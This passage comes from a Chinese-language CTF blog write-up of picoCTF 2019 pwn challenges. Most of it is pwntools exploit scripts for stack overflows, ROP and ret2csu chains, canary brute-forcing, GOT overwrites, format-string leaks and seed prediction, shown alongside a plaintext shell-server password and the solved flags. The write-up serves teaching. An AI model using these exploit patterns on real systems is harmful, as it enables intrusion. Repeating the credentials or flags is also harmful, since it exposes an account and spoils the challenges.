class="string">"kangel"</span>,password=<span class="string">"2314838574"</span>, port=<span class="number">22</span>)</span><br><span class="line">s.set_working_directory(<span class="string">"/problems/newoverflow-1_4_3fc8f7e1553d8d36ded1be37c306f3a4"</span>)</span><br><span class="line">p = s.process(<span class="string">"./vuln"</span>)</span><br><span class="line"><span class="comment">#p = process("./vulnnew")</span></span><br><span class="line">flag_addr = <span class="number">0x0000000000400767</span></span><br><span class="line">puts_addr = <span class="number">0x00000000004005f0</span></span><br><span class="line">p.recvuntil(<span class="string">"Welcome to 64-bit. Give me a string that gets you the flag: "</span>)</span><br><span class="line">payload = <span class="number">0x48</span>*<span class="string">'a'</span> + p64(puts_addr) + p64(flag_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><code>picoCTF{th4t_w4snt_t00_d1ff3r3nt_r1ghT?_72d3e39f}</code></p><h4 id="NewOverFlow-2"><a href="#NewOverFlow-2" class="headerlink" title="NewOverFlow 2"></a>NewOverFlow 2</h4><p>这道题需要用到ret2csu来覆写参数，具体参见<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/medium-rop-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/medium-rop-zh/</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">s=ssh(host=<span class="string">"2019shell1.picoctf.com"</span>,user=<span class="string">"kangel"</span>,password=<span class="string">"2314838574"</span>, port=<span class="number">22</span>)</span><br><span class="line">s.set_working_directory(<span class="string">"/problems/newoverflow-2_1_bcd752d56a87efb5dfc9803b461809f7"</span>)</span><br><span class="line">p = s.process(<span class="string">"./vuln"</span>)</span><br><span class="line"><span class="comment">#p = process("./vuln")</span></span><br><span class="line">elf=ELF(<span class="string">"./vuln"</span>)</span><br><span class="line">flag_addr = <span class="number">0x000000000040084d</span></span><br><span class="line">balance_got = elf.got[<span class="string">'getegid'</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line">pop_rdi = <span class="number">0x4009a3</span></span><br><span class="line">f1_addr = <span class="number">0x400767</span></span><br><span class="line">f2_addr = <span class="number">0x400781</span></span><br><span class="line">win_addr = <span class="number">0x4007be</span></span><br><span class="line">p.recvuntil(<span class="string">"numbers?"</span>)</span><br><span class="line">payload = <span class="number">0x48</span>*<span class="string">'a'</span> + p64(<span class="number">0x4005f0</span>) + p64(pop_rdi) + p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p64(f1_addr)</span><br><span class="line">csu_end_addr = <span class="number">0x40099a</span></span><br><span class="line">csu_front_addr = <span class="number">0x400980</span></span><br><span class="line">payload += p64(csu_end_addr) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(balance_got) + p64(<span class="number">0xBAADCAFE</span>) + p64(<span class="number">0xCAFEBABE</span>) + p64(<span class="number">0xABADBABE</span>)</span><br><span class="line">payload += p64(csu_front_addr) + <span class="number">0x38</span>*<span class="string">'a'</span> + p64(f2_addr) + p64(main_addr)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">"numbers?"</span>)</span><br><span class="line">payload = <span class="number">0x48</span>*<span class="string">'a'</span> + p64(win_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#pause(5)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>结果如下</p><p><code>picoCTF{r0p_1t_d0nT_st0p_1t_3b39d86e}</code></p><h4 id="CanaRy"><a href="#CanaRy" class="headerlink" title="CanaRy"></a>CanaRy</h4><h5 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h5><p>首先读入canary.txt到.bss中，将该canary写进栈中。读入数据，判断是否覆盖掉canary</p><h5 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h5><p>首先爆破canary</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">canary = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">canary_temp = canary + chr(a)</span><br><span class="line">p = s.process(<span class="string">"./vuln"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"entry:\n&gt; "</span> , str(<span class="number">0x100</span>))</span><br><span class="line">payload = <span class="string">"a"</span> * <span class="number">0x20</span> + canary_temp</span><br><span class="line">p.sendafter(<span class="string">"Input&gt; "</span> , payload)</span><br><span class="line">result = p.recvline()</span><br><span class="line">log.info(result)</span><br><span class="line">p.close()</span><br><span class="line"><span class="keyword">if</span> <span class="string">"Stack Smashing"</span> <span class="keyword">not</span> <span class="keyword">in</span> result:</span><br><span class="line">canary += chr(a)</span><br><span class="line">log.success(<span class="string">"canary found :"</span> + canary)</span><br><span class="line">pause()</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>得到canary为<code>wrvW</code>，然后覆盖掉返回地址为display_flag地址即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s=ssh(host=<span class="string">"2019shell1.picoctf.com"</span>,user=<span class="string">"kangel"</span>,password=<span class="string">"2314838574"</span>, port=<span class="number">22</span>)</span><br><span class="line">s.set_working_directory(<span class="string">"/problems/canary_6_c4c3b4565f3c8c0c855907b211b63efe"</span>)</span><br><span class="line">elf = ELF(<span class="string">'./vuln'</span>)</span><br><span class="line"><span class="keyword">print</span> hex(elf.symbols[<span class="string">'display_flag'</span>]) <span class="comment">#0x7ed</span></span><br><span class="line">canary = <span class="string">"wrvW"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">p = s.process(<span class="string">"./vuln"</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x20</span> + canary + <span class="string">"b"</span> * (<span class="number">0xc</span> + <span class="number">0x4</span>)+<span class="string">'\xed\x97'</span></span><br><span class="line">p.recvuntil(<span class="string">"entry:\n&gt; "</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x100</span>))</span><br><span class="line">p.recvuntil(<span class="string">"Input&gt; "</span>) </span><br><span class="line">p.send(payload)</span><br><span class="line">result = p.recvall()</span><br><span class="line">log.info(result)</span><br><span class="line">p.close()</span><br><span class="line"><span class="keyword">if</span> <span class="string">"picoCTF"</span> <span class="keyword">in</span> result:</span><br><span class="line">log.success(<span class="string">"flag found!"</span>)</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><code>picoCTF{cAnAr135_mU5t_b3_r4nd0m!_40765d8a}</code></p><h4 id="leap-frog"><a href="#leap-frog" class="headerlink" title="leap-frog"></a>leap-frog</h4><p>程序分析：要使win1、win2、win3都不为零才能打印flag</p><p>攻击思路：直接写数据到win中，简单粗暴</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">s=ssh(host=<span class="string">"2019shell1.picoctf.com"</span>,user=<span class="string">"kangel"</span>,password=<span class="string">"2314838574"</span>, port=<span class="number">22</span>)</span><br><span class="line">s.set_working_directory(<span class="string">"/problems/leap-frog_0_b02581eeadf3f35f4356e23db08bddf9"</span>)</span><br><span class="line">p = s.process(<span class="string">"./rop"</span>)</span><br><span class="line">flag_addr = <span class="number">0x080486B3</span></span><br><span class="line">gets_addr = <span class="number">0x08048430</span></span><br><span class="line">p.recvuntil(<span class="string">"input&gt; "</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x18</span>+<span class="string">'aaaa'</span> + p32(gets_addr) + p32(flag_addr) +p32(<span class="number">0x0804a03d</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">'2222'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><code>picoCTF{h0p_r0p_t0p_y0uR_w4y_t0_v1ct0rY_8783895b}</code></p><h4 id="messy-malloc"><a href="#messy-malloc" class="headerlink" title="messy-malloc"></a>messy-malloc</h4><p>一道简单的堆题，注意环境是libc.2.27.so，引入了tcache机制。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">"2019shell1.picoctf.com"</span>,<span class="string">"49920"</span>)</span><br><span class="line"><span class="comment">#p = process("./auth")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_flag</span><span class="params">()</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"your command:"</span>)</span><br><span class="line">p.sendline(<span class="string">"print-flag"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(length,name)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"your command:"</span>)</span><br><span class="line">p.sendline(<span class="string">"login"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"of your username"</span>)</span><br><span class="line">p.sendline(str(length))</span><br><span class="line">p.recvuntil(<span class="string">"enter your username"</span>)</span><br><span class="line">p.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">()</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"your command:"</span>)</span><br><span class="line">p.sendline(<span class="string">"logout"</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"aaaaaaaa"</span> + p64(<span class="number">0x4343415F544F4F52</span>) + p64(<span class="number">0x45444F435F535345</span>)</span><br><span class="line">login(<span class="number">32</span>,payload)</span><br><span class="line">logout()</span><br><span class="line">login(<span class="number">32</span>,<span class="string">'kangel'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">print_flag()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><code>picoCTF{g0ttA_cl3aR_y0uR_m4110c3d_m3m0rY_64bcc6a3}</code></p><h4 id="stringzz"><a href="#stringzz" class="headerlink" title="stringzz"></a>stringzz</h4><p>程序分析：将flag写进内存，直接爆破吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s=ssh(host=<span class="string">"2019shell1.picoctf.com"</span>,user=<span class="string">"kangel"</span>,password=<span class="string">"2314838574"</span>, port=<span class="number">22</span>)</span><br><span class="line">s.set_working_directory(<span class="string">"/problems/stringzz_0_973c705187166a133a5293d2fc93b552"</span>)</span><br><span class="line"><span class="comment">#p = s.process("./vuln")</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):<span class="comment">#37</span></span><br><span class="line">p=s.process(<span class="string">"./vuln"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"back:\n"</span>)</span><br><span class="line">payload = <span class="string">'%&#123;&#125;$s'</span>.format(i)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">data = p.recvall()</span><br><span class="line">p.close()</span><br><span class="line"><span class="keyword">if</span> <span class="string">'pico'</span> <span class="keyword">in</span> data:</span><br><span class="line"><span class="keyword">print</span> data</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><code>picoCTF{str1nG_CH3353_b7f47023}</code></p><h4 id="GoT"><a href="#GoT" class="headerlink" title="GoT"></a>GoT</h4><p>查看保护</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[+] checksec <span class="keyword">for</span> <span class="string">'/mnt/hgfs/shared/picoCTF/got/vuln'</span></span><br><span class="line">Canary                        : Yes</span><br><span class="line">NX                            : Yes</span><br><span class="line">PIE                           : No</span><br><span class="line">Fortify                       : No</span><br><span class="line">RelRO                         : Partial <span class="comment">##got表可写</span></span><br></pre></td></tr></table></figure><p>思路很简单，覆写got表即可，将exit的地址换成win</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">s=ssh(host=<span class="string">"2019shell1.picoctf.com"</span>,user=<span class="string">"kangel"</span>,password=<span class="string">"2314838574"</span>, port=<span class="number">22</span>)</span><br><span class="line">s.set_working_directory(<span class="string">"/problems/got_4_97e6bb0e913c179989678416d8a8fb22"</span>)</span><br><span class="line">p = s.process(<span class="string">"./vuln"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./vuln"</span>)</span><br><span class="line">exit_got = elf.got[<span class="string">'exit'</span>]</span><br><span class="line">win_addr = elf.sym[<span class="string">'win'</span>]</span><br><span class="line"><span class="keyword">print</span> exit_got</span><br><span class="line"><span class="keyword">print</span> win_addr</span><br><span class="line">p.recvuntil(<span class="string">"address\n"</span>)</span><br><span class="line">p.sendline(str(exit_got))</span><br><span class="line">p.recvuntil(<span class="string">"value?\n"</span>)</span><br><span class="line">p.sendline(str(win_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><code>picoCTF{A_s0ng_0f_1C3_and_f1r3_db12a9ed}</code></p><h4 id="pointy"><a href="#pointy" class="headerlink" title="pointy"></a>pointy</h4><p>程序逻辑漏洞</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s=ssh(host=<span class="string">"2019shell1.picoctf.com"</span>,user=<span class="string">"kangel"</span>,password=<span class="string">"2314838574"</span>, port=<span class="number">22</span>)</span><br><span class="line">s.set_working_directory(<span class="string">"/problems/pointy_2_030e643c8a0e842516b1c6a3ff826144"</span>)</span><br><span class="line">p = s.process(<span class="string">"./vuln"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./vuln"</span>)</span><br><span class="line">win_addr = elf.sym[<span class="string">'win'</span>]</span><br><span class="line">p.recvuntil(<span class="string">"name of a student"</span>)</span><br><span class="line">p.sendline(<span class="string">"aaaa"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"professor of a student "</span>)</span><br><span class="line">p.sendline(<span class="string">'bbbb'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"give the score "</span>)</span><br><span class="line">p.sendline(<span class="string">'aaaa'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"will be scored "</span>)</span><br><span class="line">p.sendline(<span class="string">"bbbb"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Input the score: "</span>)</span><br><span class="line">p.sendline(str(win_addr))</span><br><span class="line">p.recvuntil(<span class="string">"name of a student"</span>)</span><br><span class="line">p.sendline(<span class="string">"bbbb"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"professor of a student "</span>)</span><br><span class="line">p.sendline(<span class="string">'aaaa'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"give the score "</span>)</span><br><span class="line">p.sendline(<span class="string">'bbbb'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"will be scored "</span>)</span><br><span class="line">p.sendline(<span class="string">"aaaa"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Input the score: "</span>)</span><br><span class="line">p.sendline(str(<span class="number">100</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4 id="seed-spring"><a href="#seed-spring" class="headerlink" title="seed_spring"></a>seed_spring</h4><p>利用ctypes生成一样的随机序列，本地与服务器可能会有延迟，测试延迟范围脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">-10</span>,<span class="number">10</span>) :</span><br><span class="line">p = remote(<span class="string">"2019shell1.picoctf.com"</span>,<span class="string">"4160"</span>)</span><br><span class="line">seed = libc.time(<span class="number">0</span>)</span><br><span class="line">libc.srand(seed+i)</span><br><span class="line"><span class="keyword">print</span> i</span><br><span class="line">p.recvuntil(<span class="string">"height: "</span>)</span><br><span class="line">p.sendline(str(libc.rand()&amp;<span class="number">0xf</span>))</span><br><span class="line">data = p.recvline()</span><br><span class="line"><span class="keyword">print</span> data</span><br><span class="line">p.close()</span><br><span class="line"><span class="keyword">if</span> <span class="string">"LEVEL"</span> <span class="keyword">in</span> data:</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"><span class="comment"># p = process("./seed_spring")</span></span><br><span class="line">p = remote(<span class="string">"2019shell1.picoctf.com"</span>,<span class="string">"4160"</span>)</span><br><span class="line">seed = libc.time(<span class="number">0</span>)</span><br><span class="line">delay = <span class="number">7</span>  <span class="comment">#延迟5到10秒，具体看网速</span></span><br><span class="line">libc.srand(seed - delay)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>) :</span><br><span class="line">p.recvuntil(<span class="string">"height: "</span>)</span><br><span class="line">p.sendline(str(libc.rand()&amp;<span class="number">0xf</span>))</span><br><span class="line">data = p.recvline()</span><br><span class="line"><span class="keyword">print</span> data</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><code>picoCTF{pseudo_random_number_generator_not_so_random_24ce919be49576c7df453a4a3e6fbd40}</code></p><h4 id="limit"><a href="#limit" class="headerlink" title="limit"></a>limit</h4><p>整数溢出，首先判断溢出的位置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">gef➤  </span><br><span class="line">0x0804865e <span class="keyword">in</span> replaceIntegerInArrayAtIndex ()</span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">───────────────────────────────────────────────────────────────── registers ────</span><br><span class="line"><span class="variable">$eax</span>   : 0x64      </span><br><span class="line"><span class="variable">$ebx</span>   : 0x0804a000  →  0x08049f0c  →  0x00000001</span><br><span class="line"><span class="variable">$ecx</span>   : 0x1       </span><br><span class="line"><span class="variable">$edx</span>   : 0xffffc378  →  0x00000064 (<span class="string">"d"</span>?)</span><br><span class="line"><span class="variable">$esp</span>   : 0xffffc388  →  0xffffce18  →  0x00000000</span><br><span class="line"><span class="variable">$ebp</span>   : 0xffffc388  →  0xffffce18  →  0x00000000</span><br><span class="line"><span class="variable">$esi</span>   : 0xf7fb0000  →  0x001d7d6c (<span class="string">"l&#125;"</span>?)</span><br><span class="line"><span class="variable">$edi</span>   : 0x0       </span><br><span class="line"><span class="variable">$eip</span>   : 0x0804865e  →  &lt;replaceIntegerInArrayAtIndex+33&gt; nop </span><br><span class="line"><span class="variable">$eflags</span>: [CARRY PARITY adjust zero SIGN <span class="built_in">trap</span> INTERRUPT direction overflow resume virtualx86 identification]</span><br><span class="line"><span class="variable">$cs</span>: 0x0023 <span class="variable">$ss</span>: 0x002b <span class="variable">$ds</span>: 0x002b <span class="variable">$es</span>: 0x002b <span class="variable">$fs</span>: 0x0000 <span class="variable">$gs</span>: 0x0063 </span><br><span class="line">───────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0xffffc388│+0x0000: 0xffffce18  →  0x00000000 ← <span class="variable">$esp</span>, <span class="variable">$ebp</span></span><br><span class="line">0xffffc38c│+0x0004: 0x080486fc  →  &lt;main+155&gt; add esp, 0x10   <span class="comment">##返回值地址0xffffc38c</span></span><br><span class="line">0xffffc390│+0x0008: 0xffffc3a0  →  0x00000000</span><br><span class="line">0xffffc394│+0x000c: 0xfffffff6</span><br><span class="line">0xffffc398│+0x0010: 0x00000064 (<span class="string">"d"</span>?)</span><br><span class="line">0xffffc39c│+0x0014: 0x0804867b  →  &lt;main+26&gt; add ebx, 0x1985</span><br><span class="line">0xffffc3a0│+0x0018: 0x00000000</span><br><span class="line">0xffffc3a4│+0x001c: 0x00000000</span><br><span class="line">─────────────────────────────────────────────────────────────── code:x86:32 ────</span><br><span class="line">    0x8048653 &lt;replaceIntegerInArrayAtIndex+22&gt; add    BYTE PTR [ebx-0x3dfef7bb], cl</span><br><span class="line">    0x8048659 &lt;replaceIntegerInArrayAtIndex+28&gt; mov    eax, DWORD PTR [ebp+0x10]</span><br><span class="line">    0x804865c &lt;replaceIntegerInArrayAtIndex+31&gt; mov    DWORD PTR [edx], eax</span><br><span class="line"> →  0x804865e &lt;replaceIntegerInArrayAtIndex+33&gt; nop    </span><br><span class="line">    0x804865f &lt;replaceIntegerInArrayAtIndex+34&gt; pop    ebp</span><br><span class="line">    0x8048660 &lt;replaceIntegerInArrayAtIndex+35&gt; ret    </span><br><span class="line">    0x8048661 &lt;main+0&gt;         lea    ecx, [esp+0x4]</span><br><span class="line">    0x8048665 &lt;main+4&gt;         and    esp, 0xfffffff0</span><br><span class="line">    0x8048668 &lt;main+7&gt;         push   DWORD PTR [ecx-0x4]</span><br><span class="line">─────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line">[<span class="comment">#0] Id 1, Name: "vuln", stopped, reason: SINGLE STEP</span></span><br><span class="line">───────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line">[<span class="comment">#0] 0x804865e → replaceIntegerInArrayAtIndex()</span></span><br><span class="line">[<span class="comment">#1] 0x80486fc → main()</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">gef➤  x/2wx 0xffffce08-0xa68-40  <span class="comment">##输入-10进行计算</span></span><br><span class="line">0xffffc378:0x000000640x0804a000</span><br><span class="line">gef➤  x/2wx 0xffffce08-0xa68-24</span><br><span class="line">0xffffc388:0xffffce180x080486fc</span><br><span class="line">gef➤  x/2wx 0xffffce08-0xa68-20  <span class="comment">##溢出长度为-（20/4=5)</span></span><br><span class="line">0xffffc38c:0x080486fc0xffffc3a0</span><br><span class="line">gef➤</span><br></pre></td></tr></table></figure><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s=ssh(host=<span class="string">"2019shell1.picoctf.com"</span>,user=<span class="string">"kangel"</span>,password=<span class="string">"2314838574"</span>, port=<span class="number">22</span>)</span><br><span class="line">s.set_working_directory(<span class="string">"/problems/l1im1tl355_1_688adedb3c25bf76cbb2c2a0fe7e9ac3"</span>)</span><br><span class="line">p = s.process(<span class="string">"./vuln"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./vuln"</span>)</span><br><span class="line"><span class="keyword">print</span> elf.sym[<span class="string">'win'</span>]</span><br><span class="line">p.recvuntil(<span class="string">"array\n"</span>)</span><br><span class="line">p.sendline(str(elf.sym[<span class="string">'win'</span>]))</span><br><span class="line">p.recvuntil(<span class="string">"value\n"</span>)</span><br><span class="line">p.sendline(str(<span class="number">-5</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><code>picoCTF{str1nG_CH3353_59c3cf5a}</code></p><h4 id="rop32"><a href="#rop32" class="headerlink" title="rop32"></a>rop32</h4><p>32位的系统调用，一般用execve(“/bin/sh”,0,0)获取shell</p><p>define __NR_execve 11</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 